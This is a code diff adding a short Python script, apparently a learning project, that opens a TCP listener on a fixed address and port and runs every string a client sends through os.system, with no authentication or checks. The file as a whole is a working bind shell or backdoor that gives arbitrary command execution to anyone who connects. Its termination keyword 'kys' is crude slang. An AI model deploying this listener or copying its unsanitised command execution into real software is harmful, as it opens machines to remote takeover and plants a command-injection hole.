@@ -1,0 +1,52 @@
+#!/usr/bin/env python3
+
+import os
+import socket
+
+
+### Define the protocol to use, TCP in this case.
+srv_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+
+### Setting up this socket server listen on the specified port.
+host = "192.168.10.6"
+port = 5555
+srv_sock.bind((host,port))
+
+
+### Listens for one connection. 
+### (this specifies the amount of simultaneous connections that can be made)
+srv_sock.listen(1)
+
+
+### While script is active, keep doing this loop.
+### This loop will wait for a connection to be made and then execute the
+### commands specified.
+while True:
+	
+	### Accept incoming connection.
+	conn, addr = srv_sock.accept()
+	
+	### Receives the data from client and decodes it.
+	data = conn.recv(1024).decode()
+
+	print ("")
+	print ("Listening for instructions...")
+	print ("")
+	
+	
+	### Gives the option to terminate the session.
+	### Client has to type "kys" as input. 
+	if data == "kys":
+		os.system ("clear")
+		print ("Client wants to terminate session, goodbye!")
+		print ("")
+		print ("")
+		break
+	else:
+		### Executes the command input from the client by os.system.
+		os.system (data)
+		
+		### This doesn't show if the cmd was successful or not.
+		print("")
+		print("Command executed, waiting for next request...")
